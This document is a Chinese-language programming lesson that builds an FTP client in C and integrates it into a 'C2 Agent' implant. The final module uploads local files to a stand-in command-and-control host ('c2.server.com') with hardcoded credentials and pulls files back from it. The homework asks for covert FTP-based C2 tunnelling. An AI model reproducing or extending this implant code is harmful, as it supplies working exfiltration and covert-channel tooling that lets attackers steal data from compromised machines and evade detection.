# 课时09：实现FTP客户端并完成通信

## 课程目标

1. 理解FTP客户端工作原理和连接流程
2. 掌握FTP控制连接和数据连接的建立方法
3. 实现完整的FTP客户端功能
4. 将FTP文件传输能力集成到C2 Agent

## 名词解释

| 名词 | 全称 | 解释 |
|------|------|------|
| PASV | Passive Mode | 被动模式，服务器开放端口等待客户端连接 |
| PORT | Active Mode | 主动模式，客户端开放端口等待服务器连接 |
| LIST | List Directory | 获取目录文件列表 |
| RETR | Retrieve | 从服务器下载文件 |
| STOR | Store | 上传文件到服务器 |
| DELE | Delete | 删除服务器文件 |
| MKD | Make Directory | 创建目录 |
| RMD | Remove Directory | 删除目录 |
| CWD | Change Working Directory | 切换当前目录 |
| PWD | Print Working Directory | 显示当前目录 |

## 使用工具

- Visual Studio 2022
- Wireshark（FTP协议分析）
- FileZilla Server（测试服务器）
- IDA Pro（协议逆向分析）

## 技术原理

### FTP客户端连接流程

```
客户端                          服务器
   |                              |
   |-------- TCP连接 21端口 ----->|
   |<------- 220 欢迎消息 --------|
   |-------- USER username ------>|
   |<------- 331 需要密码 --------|
   |-------- PASS password ------>|
   |<------- 230 登录成功 --------|
   |                              |
   |-------- PASV ------------->|  (请求被动模式)
   |<------- 227 (h1,h2,h3,h4,p1,p2) |  (数据端口)
   |                              |
   |-------- TCP连接数据端口 ---->|
   |-------- LIST/RETR/STOR ----->|
   |<------- 数据传输 ------------|
   |<------- 226 传输完成 --------|
   |                              |
   |-------- QUIT --------------->|
   |<------- 221 再见 ------------|
```

### FTP响应码分类

```
1xx - 肯定预备应答
2xx - 肯定完成应答
3xx - 肯定中间应答
4xx - 暂时否定应答
5xx - 永久否定应答

常用响应码：
220 - 服务就绪
221 - 服务关闭连接
226 - 数据连接关闭，传输成功
227 - 进入被动模式
230 - 用户登录成功
331 - 用户名正确，需要密码
425 - 无法建立数据连接
530 - 未登录
550 - 文件不可用
```

## 代码实现

### FTP客户端结构

```c
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

// FTP客户端结构
typedef struct _FTP_CLIENT {
    SOCKET      controlSocket;      // 控制连接
    SOCKET      dataSocket;         // 数据连接
    char        host[256];          // 服务器地址
    int         port;               // 控制端口
    char        username[64];       // 用户名
    char        password[64];       // 密码
    char        currentDir[MAX_PATH]; // 当前目录
    BOOL        connected;          // 连接状态
    BOOL        loggedIn;           // 登录状态
    char        lastResponse[1024]; // 最后响应
    int         lastCode;           // 最后响应码
} FTP_CLIENT, *PFTP_CLIENT;

// FTP文件信息
typedef struct _FTP_FILE_INFO {
    char        name[260];
    BOOL        isDirectory;
    LONGLONG    size;
    FILETIME    modifyTime;
} FTP_FILE_INFO;

// 初始化FTP客户端
PFTP_CLIENT FtpClientCreate(void) {
    PFTP_CLIENT client = (PFTP_CLIENT)HeapAlloc(
        GetProcessHeap(), 
        HEAP_ZERO_MEMORY, 
        sizeof(FTP_CLIENT)
    );
    
    if (client) {
        client->controlSocket = INVALID_SOCKET;
        client->dataSocket = INVALID_SOCKET;
        client->port = 21;
    }
    
    return client;
}

// 销毁FTP客户端
void FtpClientDestroy(PFTP_CLIENT client) {
    if (client) {
        if (client->controlSocket != INVALID_SOCKET) {
            closesocket(client->controlSocket);
        }
        if (client->dataSocket != INVALID_SOCKET) {
            closesocket(client->dataSocket);
        }
        HeapFree(GetProcessHeap(), 0, client);
    }
}
```

### 发送FTP命令和接收响应

```c
// 发送FTP命令
BOOL FtpSendCommand(PFTP_CLIENT client, const char* format, ...) {
    char command[1024];
    va_list args;
    
    va_start(args, format);
    vsnprintf(command, sizeof(command), format, args);
    va_end(args);
    
    // 添加CRLF
    strcat(command, "\r\n");
    
    int sent = send(client->controlSocket, command, strlen(command), 0);
    
    printf("[->] %s", command);
    
    return (sent > 0);
}

// 接收FTP响应
int FtpRecvResponse(PFTP_CLIENT client) {
    char buffer[4096] = {0};
    int totalRecv = 0;
    
    while (1) {
        int recvLen = recv(client->controlSocket, 
                          buffer + totalRecv, 
                          sizeof(buffer) - totalRecv - 1, 
                          0);
        
        if (recvLen <= 0) break;
        
        totalRecv += recvLen;
        buffer[totalRecv] = '\0';
        
        // 检查是否接收完成（以\r\n结尾且有响应码）
        if (totalRecv >= 4 && strstr(buffer, "\r\n")) {
            // 多行响应检查
            char* lastLine = buffer;
            char* p = buffer;
            while ((p = strstr(p, "\r\n")) != NULL) {
                p += 2;
                if (*p) lastLine = p;
            }
            
            // 单行响应或多行响应结束
            if (isdigit(buffer[0]) && isdigit(buffer[1]) && 
                isdigit(buffer[2]) && buffer[3] == ' ') {
                break;
            }
        }
    }
    
    strncpy(client->lastResponse, buffer, sizeof(client->lastResponse) - 1);
    
    // 解析响应码
    client->lastCode = atoi(buffer);
    
    printf("[<-] %s", buffer);
    
    return client->lastCode;
}

// 检查响应码范围
BOOL FtpCheckResponse(PFTP_CLIENT client, int minCode, int maxCode) {
    return (client->lastCode >= minCode && client->lastCode <= maxCode);
}
```

### 连接和登录

```c
// 连接FTP服务器
BOOL FtpConnect(PFTP_CLIENT client, const char* host, int port) {
    struct addrinfo hints, *result = NULL;
    char portStr[16];
    
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    
    sprintf(portStr, "%d", port ? port : 21);
    
    if (getaddrinfo(host, portStr, &hints, &result) != 0) {
        printf("[-] 无法解析主机: %s\n", host);
        return FALSE;
    }
    
    client->controlSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (client->controlSocket == INVALID_SOCKET) {
        freeaddrinfo(result);
        return FALSE;
    }
    
    if (connect(client->controlSocket, result->ai_addr, (int)result->ai_addrlen) != 0) {
        printf("[-] 连接失败\n");
        closesocket(client->controlSocket);
        client->controlSocket = INVALID_SOCKET;
        freeaddrinfo(result);
        return FALSE;
    }
    
    freeaddrinfo(result);
    
    strncpy(client->host, host, sizeof(client->host) - 1);
    client->port = port ? port : 21;
    
    // 接收欢迎消息
    int code = FtpRecvResponse(client);
    if (code != 220) {
        printf("[-] 服务器未就绪: %d\n", code);
        return FALSE;
    }
    
    client->connected = TRUE;
    printf("[+] 已连接到 %s:%d\n", host, client->port);
    
    return TRUE;
}

// 登录FTP服务器
BOOL FtpLogin(PFTP_CLIENT client, const char* username, const char* password) {
    if (!client->connected) return FALSE;
    
    // 发送用户名
    FtpSendCommand(client, "USER %s", username);
    int code = FtpRecvResponse(client);
    
    if (code == 230) {
        // 无需密码
        client->loggedIn = TRUE;
        return TRUE;
    }
    
    if (code != 331) {
        printf("[-] 用户名错误: %d\n", code);
        return FALSE;
    }
    
    // 发送密码
    FtpSendCommand(client, "PASS %s", password);
    code = FtpRecvResponse(client);
    
    if (code != 230) {
        printf("[-] 密码错误: %d\n", code);
        return FALSE;
    }
    
    strncpy(client->username, username, sizeof(client->username) - 1);
    strncpy(client->password, password, sizeof(client->password) - 1);
    client->loggedIn = TRUE;
    
    printf("[+] 登录成功: %s\n", username);
    
    return TRUE;
}

// 断开连接
void FtpDisconnect(PFTP_CLIENT client) {
    if (client->connected) {
        FtpSendCommand(client, "QUIT");
        FtpRecvResponse(client);
        
        closesocket(client->controlSocket);
        client->controlSocket = INVALID_SOCKET;
        client->connected = FALSE;
        client->loggedIn = FALSE;
    }
}
```

### 被动模式和数据连接

```c
// 解析PASV响应
BOOL ParsePasvResponse(const char* response, char* ip, int* port) {
    // 格式: 227 Entering Passive Mode (h1,h2,h3,h4,p1,p2)
    const char* start = strchr(response, '(');
    if (!start) return FALSE;
    
    int h1, h2, h3, h4, p1, p2;
    if (sscanf(start, "(%d,%d,%d,%d,%d,%d)", 
               &h1, &h2, &h3, &h4, &p1, &p2) != 6) {
        return FALSE;
    }
    
    sprintf(ip, "%d.%d.%d.%d", h1, h2, h3, h4);
    *port = p1 * 256 + p2;
    
    return TRUE;
}

// 进入被动模式并建立数据连接
BOOL FtpOpenDataConnection(PFTP_CLIENT client) {
    // 关闭旧的数据连接
    if (client->dataSocket != INVALID_SOCKET) {
        closesocket(client->dataSocket);
        client->dataSocket = INVALID_SOCKET;
    }
    
    // 发送PASV命令
    FtpSendCommand(client, "PASV");
    int code = FtpRecvResponse(client);
    
    if (code != 227) {
        printf("[-] PASV失败: %d\n", code);
        return FALSE;
    }
    
    // 解析数据端口
    char dataHost[64];
    int dataPort;
    
    if (!ParsePasvResponse(client->lastResponse, dataHost, &dataPort)) {
        printf("[-] 解析PASV响应失败\n");
        return FALSE;
    }
    
    printf("[*] 数据连接: %s:%d\n", dataHost, dataPort);
    
    // 建立数据连接
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(dataPort);
    addr.sin_addr.s_addr = inet_addr(dataHost);
    
    client->dataSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (client->dataSocket == INVALID_SOCKET) {
        return FALSE;
    }
    
    if (connect(client->dataSocket, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
        printf("[-] 数据连接失败\n");
        closesocket(client->dataSocket);
        client->dataSocket = INVALID_SOCKET;
        return FALSE;
    }
    
    return TRUE;
}

// 关闭数据连接
void FtpCloseDataConnection(PFTP_CLIENT client) {
    if (client->dataSocket != INVALID_SOCKET) {
        closesocket(client->dataSocket);
        client->dataSocket = INVALID_SOCKET;
    }
}
```

### 目录操作

```c
// 获取当前目录
BOOL FtpGetCurrentDir(PFTP_CLIENT client, char* dir, int dirLen) {
    FtpSendCommand(client, "PWD");
    int code = FtpRecvResponse(client);
    
    if (code != 257) return FALSE;
    
    // 解析目录 "257 "/path" is current directory"
    char* start = strchr(client->lastResponse, '"');
    if (!start) return FALSE;
    
    char* end = strchr(start + 1, '"');
    if (!end) return FALSE;
    
    int len = end - start - 1;
    if (len >= dirLen) len = dirLen - 1;
    
    strncpy(dir, start + 1, len);
    dir[len] = '\0';
    
    return TRUE;
}

// 切换目录
BOOL FtpChangeDir(PFTP_CLIENT client, const char* dir) {
    FtpSendCommand(client, "CWD %s", dir);
    return (FtpRecvResponse(client) == 250);
}

// 创建目录
BOOL FtpMakeDir(PFTP_CLIENT client, const char* dir) {
    FtpSendCommand(client, "MKD %s", dir);
    return (FtpRecvResponse(client) == 257);
}

// 删除目录
BOOL FtpRemoveDir(PFTP_CLIENT client, const char* dir) {
    FtpSendCommand(client, "RMD %s", dir);
    return (FtpRecvResponse(client) == 250);
}

// 列出目录
BOOL FtpListDir(PFTP_CLIENT client, char* buffer, int bufferLen) {
    // 设置ASCII模式
    FtpSendCommand(client, "TYPE A");
    FtpRecvResponse(client);
    
    // 打开数据连接
    if (!FtpOpenDataConnection(client)) {
        return FALSE;
    }
    
    // 发送LIST命令
    FtpSendCommand(client, "LIST");
    int code = FtpRecvResponse(client);
    
    if (code != 150 && code != 125) {
        FtpCloseDataConnection(client);
        return FALSE;
    }
    
    // 接收目录列表
    int totalRecv = 0;
    int recvLen;
    
    while ((recvLen = recv(client->dataSocket, 
                          buffer + totalRecv, 
                          bufferLen - totalRecv - 1, 
                          0)) > 0) {
        totalRecv += recvLen;
    }
    buffer[totalRecv] = '\0';
    
    FtpCloseDataConnection(client);
    
    // 等待传输完成响应
    code = FtpRecvResponse(client);
    
    return (code == 226);
}
```

### 文件传输

```c
// 设置传输模式
BOOL FtpSetBinaryMode(PFTP_CLIENT client) {
    FtpSendCommand(client, "TYPE I");
    return (FtpRecvResponse(client) == 200);
}

BOOL FtpSetAsciiMode(PFTP_CLIENT client) {
    FtpSendCommand(client, "TYPE A");
    return (FtpRecvResponse(client) == 200);
}

// 下载文件
BOOL FtpDownloadFile(PFTP_CLIENT client, 
                     const char* remotePath, 
                     const char* localPath) {
    // 设置二进制模式
    FtpSetBinaryMode(client);
    
    // 打开数据连接
    if (!FtpOpenDataConnection(client)) {
        return FALSE;
    }
    
    // 发送RETR命令
    FtpSendCommand(client, "RETR %s", remotePath);
    int code = FtpRecvResponse(client);
    
    if (code != 150 && code != 125) {
        FtpCloseDataConnection(client);
        return FALSE;
    }
    
    // 创建本地文件
    HANDLE hFile = CreateFileA(
        localPath,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    
    if (hFile == INVALID_HANDLE_VALUE) {
        FtpCloseDataConnection(client);
        return FALSE;
    }
    
    // 接收数据并写入文件
    char buffer[8192];
    int recvLen;
    LONGLONG totalBytes = 0;
    
    while ((recvLen = recv(client->dataSocket, buffer, sizeof(buffer), 0)) > 0) {
        DWORD written;
        WriteFile(hFile, buffer, recvLen, &written, NULL);
        totalBytes += recvLen;
        
        // 显示进度
        printf("\r[*] 已下载: %lld bytes", totalBytes);
    }
    printf("\n");
    
    CloseHandle(hFile);
    FtpCloseDataConnection(client);
    
    // 等待传输完成响应
    code = FtpRecvResponse(client);
    
    if (code == 226) {
        printf("[+] 下载完成: %s\n", localPath);
        return TRUE;
    }
    
    return FALSE;
}

// 上传文件
BOOL FtpUploadFile(PFTP_CLIENT client, 
                   const char* localPath, 
                   const char* remotePath) {
    // 打开本地文件
    HANDLE hFile = CreateFileA(
        localPath,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] 无法打开本地文件: %s\n", localPath);
        return FALSE;
    }
    
    // 获取文件大小
    LARGE_INTEGER fileSize;
    GetFileSizeEx(hFile, &fileSize);
    
    // 设置二进制模式
    FtpSetBinaryMode(client);
    
    // 打开数据连接
    if (!FtpOpenDataConnection(client)) {
        CloseHandle(hFile);
        return FALSE;
    }
    
    // 发送STOR命令
    FtpSendCommand(client, "STOR %s", remotePath);
    int code = FtpRecvResponse(client);
    
    if (code != 150 && code != 125) {
        CloseHandle(hFile);
        FtpCloseDataConnection(client);
        return FALSE;
    }
    
    // 读取文件并发送
    char buffer[8192];
    DWORD bytesRead;
    LONGLONG totalBytes = 0;
    
    while (ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
        int sent = 0;
        while (sent < (int)bytesRead) {
            int n = send(client->dataSocket, buffer + sent, bytesRead - sent, 0);
            if (n <= 0) break;
            sent += n;
        }
        
        totalBytes += bytesRead;
        
        // 显示进度
        printf("\r[*] 已上传: %lld / %lld bytes (%.1f%%)", 
               totalBytes, fileSize.QuadPart,
               (double)totalBytes / fileSize.QuadPart * 100);
    }
    printf("\n");
    
    CloseHandle(hFile);
    FtpCloseDataConnection(client);
    
    // 等待传输完成响应
    code = FtpRecvResponse(client);
    
    if (code == 226) {
        printf("[+] 上传完成: %s\n", remotePath);
        return TRUE;
    }
    
    return FALSE;
}

// 删除文件
BOOL FtpDeleteFile(PFTP_CLIENT client, const char* remotePath) {
    FtpSendCommand(client, "DELE %s", remotePath);
    return (FtpRecvResponse(client) == 250);
}

// 获取文件大小
LONGLONG FtpGetFileSize(PFTP_CLIENT client, const char* remotePath) {
    FtpSendCommand(client, "SIZE %s", remotePath);
    int code = FtpRecvResponse(client);
    
    if (code != 213) return -1;
    
    // 解析大小 "213 12345"
    char* sizeStr = client->lastResponse + 4;
    return _atoi64(sizeStr);
}
```

### C2 Agent FTP文件传输模块

```c
// FTP配置
typedef struct _FTP_CONFIG {
    char        server[256];
    int         port;
    char        username[64];
    char        password[64];
    char        uploadDir[MAX_PATH];    // 上传目录
    char        downloadDir[MAX_PATH];  // 下载目录
} FTP_CONFIG;

// FTP传输任务
typedef enum _FTP_TASK_TYPE {
    FTP_TASK_UPLOAD,
    FTP_TASK_DOWNLOAD,
    FTP_TASK_LIST,
    FTP_TASK_DELETE
} FTP_TASK_TYPE;

typedef struct _FTP_TASK {
    FTP_TASK_TYPE   type;
    char            localPath[MAX_PATH];
    char            remotePath[MAX_PATH];
    BOOL            completed;
    BOOL            success;
    char            result[1024];
} FTP_TASK;

// 执行FTP任务
BOOL ExecuteFtpTask(FTP_CONFIG* config, FTP_TASK* task) {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
    
    PFTP_CLIENT client = FtpClientCreate();
    
    // 连接服务器
    if (!FtpConnect(client, config->server, config->port)) {
        strcpy(task->result, "连接失败");
        FtpClientDestroy(client);
        return FALSE;
    }
    
    // 登录
    if (!FtpLogin(client, config->username, config->password)) {
        strcpy(task->result, "登录失败");
        FtpDisconnect(client);
        FtpClientDestroy(client);
        return FALSE;
    }
    
    BOOL success = FALSE;
    
    switch (task->type) {
        case FTP_TASK_UPLOAD:
            success = FtpUploadFile(client, task->localPath, task->remotePath);
            break;
            
        case FTP_TASK_DOWNLOAD:
            success = FtpDownloadFile(client, task->remotePath, task->localPath);
            break;
            
        case FTP_TASK_LIST:
            success = FtpListDir(client, task->result, sizeof(task->result));
            break;
            
        case FTP_TASK_DELETE:
            success = FtpDeleteFile(client, task->remotePath);
            break;
    }
    
    task->completed = TRUE;
    task->success = success;
    
    FtpDisconnect(client);
    FtpClientDestroy(client);
    WSACleanup();
    
    return success;
}

// Agent文件上传到C2
BOOL AgentUploadFileToC2(const char* localPath) {
    FTP_CONFIG config = {
        .server = "c2.server.com",
        .port = 21,
        .username = "agent",
        .password = "agent_pass"
    };
    
    // 生成远程文件名 (使用时间戳)
    char remotePath[MAX_PATH];
    SYSTEMTIME st;
    GetSystemTime(&st);
    
    const char* filename = strrchr(localPath, '\\');
    filename = filename ? filename + 1 : localPath;
    
    sprintf(remotePath, "/uploads/%04d%02d%02d_%02d%02d%02d_%s",
            st.wYear, st.wMonth, st.wDay,
            st.wHour, st.wMinute, st.wSecond,
            filename);
    
    FTP_TASK task = {
        .type = FTP_TASK_UPLOAD
    };
    strncpy(task.localPath, localPath, MAX_PATH);
    strncpy(task.remotePath, remotePath, MAX_PATH);
    
    return ExecuteFtpTask(&config, &task);
}

// Agent从C2下载文件
BOOL AgentDownloadFileFromC2(const char* remotePath, const char* localPath) {
    FTP_CONFIG config = {
        .server = "c2.server.com",
        .port = 21,
        .username = "agent",
        .password = "agent_pass"
    };
    
    FTP_TASK task = {
        .type = FTP_TASK_DOWNLOAD
    };
    strncpy(task.localPath, localPath, MAX_PATH);
    strncpy(task.remotePath, remotePath, MAX_PATH);
    
    return ExecuteFtpTask(&config, &task);
}
```

### 完整FTP客户端测试

```c
int main() {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
    
    PFTP_CLIENT client = FtpClientCreate();
    
    // 连接并登录
    if (!FtpConnect(client, "192.168.1.100", 21)) {
        printf("连接失败\n");
        return 1;
    }
    
    if (!FtpLogin(client, "user", "password")) {
        printf("登录失败\n");
        return 1;
    }
    
    // 显示当前目录
    char currentDir[MAX_PATH];
    if (FtpGetCurrentDir(client, currentDir, MAX_PATH)) {
        printf("当前目录: %s\n", currentDir);
    }
    
    // 列出文件
    char listing[4096];
    if (FtpListDir(client, listing, sizeof(listing))) {
        printf("\n目录列表:\n%s\n", listing);
    }
    
    // 下载文件
    FtpDownloadFile(client, "/test.txt", "C:\\temp\\test.txt");
    
    // 上传文件
    FtpUploadFile(client, "C:\\temp\\upload.exe", "/uploads/upload.exe");
    
    // 断开连接
    FtpDisconnect(client);
    FtpClientDestroy(client);
    
    WSACleanup();
    return 0;
}
```

## 课后作业

1. **实现断点续传功能**
   - 使用REST命令指定开始位置
   - 支持下载和上传的断点续传
   - 处理网络中断后的恢复

2. **添加FTPS支持**
   - 使用AUTH TLS/SSL命令
   - 集成OpenSSL进行加密通信
   - 验证服务器证书

3. **实现FTP隧道**
   - 通过FTP数据通道传输自定义数据
   - 将命令控制封装在文件传输中
   - 实现基于FTP的隐蔽C2通信
